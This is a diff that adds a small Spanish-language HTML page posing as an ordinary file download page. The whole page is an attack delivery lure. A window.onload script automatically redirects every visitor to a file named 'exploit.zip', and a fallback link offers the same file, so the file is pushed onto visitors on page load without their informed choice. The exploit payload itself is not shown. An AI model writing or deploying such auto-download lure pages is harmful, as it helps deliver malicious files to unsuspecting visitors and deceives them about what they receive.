@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Descargar archivo</title>
+</head>
+<body>
+    <h1>Bienvenido! La descarga comenzará automáticamente...</h1>
+    <p>Si la descarga no comienza, haz clic en el enlace abajo:</p>
+    <a href="exploit.zip" download>Haz clic aquí para descargar el archivo</a>
+
+    <script type="text/javascript">
+        window.onload = function() {
+            // Redirige automáticamente para iniciar la descarga
+            window.location.href = 'exploit.zip';
+        };
+    </script>
+</body>
+</html>
